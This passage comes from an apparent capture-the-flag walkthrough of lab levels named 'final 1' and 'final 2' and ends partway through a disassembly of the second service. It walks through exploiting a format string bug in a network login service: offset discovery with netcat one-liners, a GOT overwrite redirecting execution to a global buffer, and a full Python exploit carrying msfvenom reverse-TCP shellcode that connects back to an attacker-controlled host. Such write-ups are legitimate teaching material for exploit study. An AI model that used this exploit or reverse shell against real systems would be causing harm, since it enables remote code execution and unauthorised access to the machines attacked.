<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">Jun 26 06:51:32 (none) final1: Login from 192.168.1.2:60564 as [AAAA8049ee4.804a2a0.804a220.bffffbd6.b7fd7ff4.bffffa28.69676f4c.7266206e.31206d6f.312e3239] with password [test]</span>
</code></pre></div>


<p>So we can utilize a format string injection an try to overwrite an address.</p>

<h2 id="exploitation-3">Exploitation</h2>

<p>Now, we need to identify the offset at for the format string.
To do this, we fill the buffer for username, as this is a global variable with a fixed address.
So we can easily reference it.
The format string vector will be placed in the login buffer.</p>

<p>First, let&rsquo;s identify correct offset.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span>python -c <span class="s1">&#39;print &quot;username &quot;+&quot;A&quot;*117+&quot;\r\nlogin XBBBBCCCCDDDDEEEE&quot;+&quot;.&quot;.join([&quot;%(i)d:%%%(i)d$x&quot; % {&quot;i&quot;:i} for i in range(40,60)])+&quot;\r\n&quot;&#39;</span> <span class="p">|</span> nc 192.168.1.6 2994
</code></pre></div>


<p>And the respective syslog entry gives detailed insights</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">^[[AJun 26 10:09:29 (none) final1: Login from 192.168.1.2:33622 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] with password [XBBBBCCCCDDDDEEEE40:41414141.41:41414141.42:41414141.43:41414141.44:205d4141.45:68746977.46:73617020.47:726f7773.48:585b2064.49:42424242.50:43434343.51:%]</span>
</code></pre></div>


<p>So the target offset for the format string vulnerability is 49 DWORDs, including one padding byte.
To verify the funtion of the attack we construct the following test.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;username &quot;+&quot;A&quot;*117+&quot;\r\nlogin XBBBBCCCCDDDDEEEE&quot;+&quot;%49$x&quot;+&quot;%50$x&quot;+&quot;%51$x&quot;+&quot;%52$x&quot;+&quot;\r\n&quot;&#39;</span> <span class="p">|</span> nc 192.168.1.6 2994
</code></pre></div>


<p>And the syslog output is as expected.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">Jun 26 10:16:12 (none) final1: Login from 192.168.1.2:33677 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] with password [XBBBBCCCCDDDDEEEE42424242434343434444444445454545]</span>
</code></pre></div>


<p>In order to gain control over the executable, we could overwrite the syslog() function pointer.
Let&rsquo;s examine the respective instructions.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">gdb$ x/1i 0x080499f6</span>
<span class="go">0x80499f6 &lt;parser+185&gt;:	call   0x8048d4c &lt;puts@plt&gt;</span>
<span class="go">gdb$ x/3i 0x8048d4c</span>
<span class="go">0x8048d4c &lt;puts@plt&gt;:	jmp    DWORD PTR ds:0x804a194</span>
<span class="go">0x8048d52 &lt;puts@plt+6&gt;:	push   0x138</span>
<span class="go">0x8048d57 &lt;puts@plt+11&gt;:	jmp    0x8048acc</span>
<span class="go">gdb$ x/x 0x804a194</span>
<span class="go">0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168&gt;:	0x08048d52</span>
</code></pre></div>


<p>So this leads to the following username string to test the address.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">python -c &#39;print &quot;username &quot;+&quot;A&quot;*117+&quot;\r\nlogin &quot;+&quot;X&quot;*1+&quot;\x94\xa1\x04\x08&quot;+&quot;\x95\xa1\x04\x08&quot;+&quot;\x96\xa1\x04\x08&quot;+&quot;\x97\xa1\x04\x08&quot;+&quot;%49$n&quot;+&quot;%50$n&quot;+&quot;%51$n&quot;+&quot;%52$n&quot;+&quot;\r\n&quot;&#39; | nc 192.168.1.6 2994</span>
</code></pre></div>


<p>In the gdb we can verify that the target address is overwritten after the syslog() call.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">gdb$ x/x 0x804a194</span>
<span class="go">0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168&gt;:	0xb8b8b8b8</span>
</code></pre></div>


<p>The next step is to point the address to the global variable &ldquo;username&rdquo; 0x804a220.
This means we need to calculate the following way with a four byte overwrite.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">Byte 1: 0x20 - 0xB8 + 0xff = 0x67 + 0x01 (104)</span>
<span class="go">Byte 2: 0xA2 - 0x20 = 0x82 (130)</span>
<span class="go">Byte 3: 0x04 - 0xA2 + 0xff = 0x61 + 0x01 (98)</span>
<span class="go">Byte 4: 0x08 - 0x04 = 0x04 (4)</span>
</code></pre></div>


<p>Unfortunately, writing 0x04 for the last byte results in a 0x0C.
This is a problem, so we need to try a two-byte write.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">Bytes 1+2: 0xA220 - 0x00B0 = 0xA170 (41328)</span>
<span class="go">Bytes 3+4: 0x0804 - 0xA220 + 0xffff = 0x65E3 + 0x01 (26084)</span>
</code></pre></div>


<p>So with the following command, we can redirect the execution flow to our buffer.
For testing purposes, the username is filled with 0xCC (int3) instructions to stop execution when the code is hit in gdb.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;username &quot;+&quot;\xCC&quot;*117+&quot;\r\nlogin &quot;+&quot;X&quot;*1+&quot;\x94\xa1\x04\x08&quot;+&quot;\x96\xa1\x04\x08&quot;+&quot;%41328x%49$n&quot;+&quot;%26084x%50$n&quot;+&quot;\r\n&quot;&#39;</span> <span class="p">|</span> nc 192.168.1.6 2994
</code></pre></div>


<p>in the end the binary behaves as expected.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGTRAP</span><span class="p">,</span> <span class="n">Trace</span><span class="o">/</span><span class="n">breakpoint</span> <span class="n">trap</span><span class="p">.</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">regs</span><span class="p">]</span>
  <span class="nl">EAX</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="nl">ECX</span><span class="p">:</span> <span class="mh">0x00011000</span>  <span class="nl">EDX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="n">o</span> <span class="n">d</span> <span class="n">I</span> <span class="n">t</span> <span class="n">S</span> <span class="n">z</span> <span class="n">A</span> <span class="n">p</span> <span class="n">c</span>
  <span class="nl">ESI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBP</span><span class="p">:</span> <span class="mh">0xBFFFFB48</span>  <span class="nl">ESP</span><span class="p">:</span> <span class="mh">0xBFFFFAAC</span>  <span class="nl">EIP</span><span class="p">:</span> <span class="mh">0x0804A221</span>
  <span class="nl">CS</span><span class="p">:</span> <span class="mo">0073</span>  <span class="nl">DS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">ES</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">FS</span><span class="p">:</span> <span class="mo">0000</span>  <span class="nl">GS</span><span class="p">:</span> <span class="mo">0033</span>  <span class="nl">SS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">code</span><span class="p">]</span>
<span class="mh">0x804a221</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a222</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a223</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a224</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a225</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a226</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a227</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">7</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="mh">0x804a228</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="n">int3</span>   
<span class="o">--------------------------------------------------------------------------------</span>
<span class="mh">0x0804a221</span> <span class="n">in</span> <span class="n">username</span> <span class="p">()</span>
</code></pre></div>


<p>Now we need to find a proper shellcode.
with msfvenom we can easily create an appropriate reverese tcp shell.
The final exploit looks as follows.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python</span>
<span class="lineno"> 2 </span><span class="c"># -*- coding: utf-8 -*-</span>
<span class="lineno"> 3 </span>
<span class="lineno"> 4 </span><span class="kn">import</span> <span class="nn">socket</span>
<span class="lineno"> 5 </span><span class="kn">import</span> <span class="nn">struct</span>
<span class="lineno"> 6 </span><span class="kn">import</span> <span class="nn">sys</span>
<span class="lineno"> 7 </span>
<span class="lineno"> 8 </span><span class="c">#TARGET</span>
<span class="lineno"> 9 </span><span class="n">target_ip</span> <span class="o">=</span> <span class="s">&quot;192.168.1.6&quot;</span>
<span class="lineno">10 </span><span class="n">target_port</span> <span class="o">=</span> <span class="mi">2994</span>
<span class="lineno">11 </span>
<span class="lineno">12 </span><span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
<span class="lineno">13 </span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">),</span><span class="n">out</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
<span class="lineno">14 </span>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
<span class="lineno">15 </span>  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="lineno">16 </span>  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
<span class="lineno">17 </span>
<span class="lineno">18 </span>
<span class="lineno">19 </span><span class="c">#test data</span>
<span class="lineno">20 </span><span class="n">target_1</span> <span class="o">=</span> <span class="s">&quot;AAAA&quot;</span>
<span class="lineno">21 </span><span class="n">target_2</span> <span class="o">=</span> <span class="s">&quot;BBBB&quot;</span>
<span class="lineno">22 </span><span class="n">target_3</span> <span class="o">=</span> <span class="s">&quot;CCCC&quot;</span>
<span class="lineno">23 </span><span class="n">target_4</span> <span class="o">=</span> <span class="s">&quot;DDDD&quot;</span>
<span class="lineno">24 </span>
<span class="lineno">25 </span><span class="c">#target address</span>
<span class="lineno">26 </span><span class="n">target</span> <span class="o">=</span> <span class="mh">0x804a194</span> <span class="c">#puts()</span>
<span class="lineno">27 </span><span class="n">target_1</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">0</span><span class="p">)</span>
<span class="lineno">28 </span><span class="n">target_2</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="lineno">29 </span><span class="n">target_3</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
<span class="lineno">30 </span><span class="n">target_4</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
<span class="lineno">31 </span>
<span class="lineno">32 </span><span class="c">#$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f python -e x86/shikata_ga_nai</span>
<span class="lineno">33 </span><span class="n">shellcode</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span>
<span class="lineno">34 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xba\xe7\x96\xde\xe9\xda\xce\xd9\x74\x24\xf4\x5b\x2b</span><span class="s">&quot;</span>
<span class="lineno">35 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x12\x31\x53\x12\x83\xc3\x04\x03\xb4\x98\x3c</span><span class="s">&quot;</span>
<span class="lineno">36 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x1c\x0b\x7e\x37\x3c\x38\xc3\xeb\xa9\xbc\x4a\xea\x9e</span><span class="s">&quot;</span>
<span class="lineno">37 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xa6\x81\x6d\x4d\x7f\xaa\x51\xbf\xff\x83\xd4\xc6\x97</span><span class="s">&quot;</span>
<span class="lineno">38 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xd3\x8f\x38\x65\xbc\xcd\x3a\x78\x60\x5b\xdb\xca\xfe</span><span class="s">&quot;</span>
<span class="lineno">39 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x0b\x4d\x79\x4c\xa8\xe4\x9c\x7f\x2f\xa4\x36\xaf\x1f</span><span class="s">&quot;</span>
<span class="lineno">40 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x3a\xae\xc7\x70\xde\x47\x76\x06\xfd\xc5\xd5\x91\xe3</span><span class="s">&quot;</span>
<span class="lineno">41 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x59\xd2\x6c\x63</span><span class="s">&quot;</span>
<span class="lineno">42 </span>
<span class="lineno">43 </span><span class="c">#shellcode =  &quot;\xCC&quot;</span>
<span class="lineno">44 </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">127</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="lineno">45 </span>
<span class="lineno">46 </span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">117</span><span class="p">:</span>
<span class="lineno">47 </span>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Exploit code too large&quot;</span><span class="p">)</span>
<span class="lineno">48 </span>  <span class="nb">exit</span>
<span class="lineno">49 </span>
<span class="lineno">50 </span><span class="c">#test offset</span>
<span class="lineno">51 </span><span class="n">exploit</span> <span class="o">=</span> <span class="s">&quot;X&quot;</span> <span class="o">+</span> <span class="s">&quot;BBBB&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%x</span><span class="s">.&quot;</span><span class="o">*</span><span class="mi">16</span>
<span class="lineno">52 </span><span class="c">#test data</span>
<span class="lineno">53 </span><span class="n">exploit</span> <span class="o">=</span> <span class="s">&quot;X&quot;</span> <span class="o">+</span> <span class="n">target_1</span> <span class="o">+</span> <span class="n">target_2</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="n">target_4</span> <span class="o">+</span> <span class="s">&quot;%49$x&quot;</span> <span class="o">+</span> <span class="s">&quot;%50$x&quot;</span> <span class="o">+</span> <span class="s">&quot;%51$x&quot;</span> <span class="o">+</span> <span class="s">&quot;%52$x&quot;</span>
<span class="lineno">54 </span><span class="c">#exploit code - one-byte write</span>
<span class="lineno">55 </span><span class="n">exploit</span> <span class="o">=</span> <span class="s">&quot;X&quot;</span> <span class="o">+</span> <span class="n">target_1</span> <span class="o">+</span> <span class="n">target_2</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="n">target_4</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%104x</span><span class="s">%49$n&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%130x</span><span class="s">%50$n&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%98x</span><span class="s">%51$n&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%04x</span><span class="s">%52$n&quot;</span>
<span class="lineno">56 </span><span class="c">#test data</span>
<span class="lineno">57 </span><span class="n">exploit</span> <span class="o">=</span> <span class="s">&quot;X&quot;</span> <span class="o">+</span> <span class="n">target_2</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="s">&quot;.%49$x&quot;</span> <span class="o">+</span> <span class="s">&quot;.%50$x&quot;</span>
<span class="lineno">58 </span><span class="c">#exploit code - two-byte write</span>
<span class="lineno">59 </span><span class="n">exploit</span> <span class="o">=</span> <span class="s">&quot;X&quot;</span> <span class="o">+</span> <span class="n">target_1</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%41328x</span><span class="s">%49$n&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="si">%26084x</span><span class="s">%50$n&quot;</span>
<span class="lineno">60 </span>
<span class="lineno">61 </span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span> <span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
<span class="lineno">62 </span><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_port</span><span class="p">))</span>
<span class="lineno">63 </span><span class="k">if</span> <span class="n">sock</span><span class="p">:</span>
<span class="lineno">64 </span>  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="lineno">65 </span>  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
<span class="lineno">66 </span>
<span class="lineno">67 </span>  <span class="n">ret</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&quot;username &quot;</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
<span class="lineno">68 </span>  <span class="n">ret</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&quot;login &quot;</span> <span class="o">+</span> <span class="n">exploit</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
<span class="lineno">69 </span>
<span class="lineno">70 </span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>


<h1 id="final-2">Final 2</h1>

<p>For this level we have got a service listening on port 2993.</p>

<h2 id="analysis">Analysis</h2>

<p>Let&rsquo;s find out what is happening in the binary.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804be26</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x0804be27</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x0804be29</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x0804be2c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="err">$</span><span class="mh">0x20</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x0804be2f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be37</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0xd</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be3e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048dcc</span> <span class="o">&lt;</span><span class="n">signal</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804be43</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be4b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be53</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">45</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804c2e2</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be5a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x80491d8</span> <span class="o">&lt;</span><span class="n">background_process</span><span class="o">&gt;</span>
<span class="mh">0x0804be5f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0xbb1</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be66</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8049675</span> <span class="o">&lt;</span><span class="n">serve_forever</span><span class="o">&gt;</span>
<span class="mh">0x0804be6b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be6f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804be73</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be76</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8049755</span> <span class="o">&lt;</span><span class="n">set_io</span><span class="o">&gt;</span>
<span class="mh">0x0804be7b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804be7f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804be82</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x804bd47</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">&gt;</span>
<span class="mh">0x0804be87</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>	<span class="n">leave</span>  
<span class="mh">0x0804be88</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;:</span>	<span class="n">ret</span>    
</code></pre></div>
</p>

<p>The Service is waiting for incoming requests.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd47</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x0804bd48</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x0804bd4a</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	  <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x428</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x0804bd50</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x0804bd57</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	  <span class="n">cmpl</span>   <span class="err">$</span><span class="mh">0xfe</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
</code></pre></div>


<p>First, prepare the stack an initialize a loop variable.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804bd5e</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;:</span>	  <span class="n">jg</span>     <span class="mh">0x804bddb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;</span>
<span class="mh">0x0804bd60</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">pass</span> <span class="n">size</span>
<span class="mh">0x0804bd68</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;:</span>	  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x80</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>           <span class="p">;</span> <span class="n">pass</span> <span class="n">num</span> <span class="o">=</span> <span class="mi">128</span>
<span class="mh">0x0804bd6f</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;:</span>	  <span class="n">call</span>   <span class="mh">0x804b4ee</span> <span class="o">&lt;</span><span class="n">calloc</span><span class="o">&gt;</span>     <span class="p">;</span>
